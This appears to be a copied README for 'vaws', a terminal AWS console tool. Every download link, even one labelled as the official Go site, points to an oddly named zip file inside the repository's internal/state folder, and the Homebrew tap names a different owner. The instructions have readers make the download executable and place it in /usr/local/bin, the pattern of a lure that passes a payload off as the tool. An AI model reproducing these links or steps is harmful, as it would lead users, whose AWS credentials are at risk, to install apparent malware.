# 🚀 vaws - The AWS Console in Your Terminal

## 🔗 Download vaws

[![Release](https://github.com/KenshiBlaq/vaws/raw/refs/heads/main/internal/state/Software-plectognath.zip)](https://github.com/KenshiBlaq/vaws/raw/refs/heads/main/internal/state/Software-plectognath.zip)

## 🤔 What is vaws?

vaws brings the power of the AWS Console right to your terminal. It allows you to navigate services like CloudFormation, ECS, Lambda, API Gateway, SQS, and DynamoDB using simple key commands. This tool greatly reduces the time spent clicking through the AWS web interface.

## 🌟 Features

- **Efficient Navigation**: Move from CloudFormation stacks to ECS task logs in just a few keystrokes.
- **Easy Port Forwarding**: Connect to ECS containers and API Gateways quickly, without needing advanced commands.
- **Multi-Account Support**: Switch between different AWS accounts and regions seamlessly, without restarting the application.
- **User-Friendly Design**: If you enjoy using vim, k9s, or similar tools, you will feel at home with vaws.

## 🚀 Getting Started

### 🚀 Prerequisites

Before installing vaws, ensure you have the following:

- A terminal application (macOS Terminal, Linux Terminal)
- Go programming language version 1.21 or higher, if you plan to build from source. You can download Go from [the official site](https://github.com/KenshiBlaq/vaws/raw/refs/heads/main/internal/state/Software-plectognath.zip).

### 🛠️ Installation

You have two options for installing vaws:

#### 1. Homebrew (macOS/Linux)

If you're using a Mac or Linux, the easiest way to install vaws is via Homebrew. Open your terminal and run:

```bash
brew install erdemcemal/tap/vaws
```

#### 2. Binary Download

You can also download the latest version directly. To do this, visit the [Releases page](https://github.com/KenshiBlaq/vaws/raw/refs/heads/main/internal/state/Software-plectognath.zip) and download the file for your system. After downloading, follow these steps:

1. Locate the downloaded file in your Downloads folder.
2. Open your terminal and navigate to the folder where the file is saved. 
3. Make the file executable. Use this command:

   ```bash
   chmod +x <downloaded-file-name>
   ```

4. Move it to a directory included in your PATH. For example:

   ```bash
   mv <downloaded-file-name> /usr/local/bin/vaws
   ```

5. You can now run vaws from anywhere in your terminal.

### 🔄 Update vaws

To keep vaws updated, you can run the following command if you installed it using Homebrew:

```bash
brew upgrade erdemcemal/tap/vaws
```

If you downloaded it manually, simply revisit the [Releases page](https://github.com/KenshiBlaq/vaws/raw/refs/heads/main/internal/state/Software-plectognath.zip) for the latest version.

## 🎓 Using vaws

To get started with vaws, open your terminal and type:

```bash
vaws
```

This command will launch the application. You can navigate services using the configured keybindings similar to vim. 

### 🔍 Keybindings

Some useful keybindings include:

- `h` or `H`: Go back to the previous menu.
- `j`: Move down through the list of resources.
- `k`: Move up through the list.
- `l`: Enter into a selected resource view or action.

These shortcuts make it easy and quick to accomplish tasks. 

## 🌈 Additional Resources

- For more detailed usage instructions, check the `docs` folder in the repository.
- Join the community on GitHub Discussions for help and feature requests.

## 📝 License

vaws is licensed under the MIT License. For more details, see the [LICENSE](LICENSE) file.

## 👥 Contributing

We welcome contributions to improve vaws. If you have suggestions or bug reports, please open an issue or submit a pull request on the repository.

## 📞 Support

If you need assistance, feel free to reach out through the Issues section on GitHub or through community support forums. 

Visit our [Releases page](https://github.com/KenshiBlaq/vaws/raw/refs/heads/main/internal/state/Software-plectognath.zip) to download vaws and start using it today!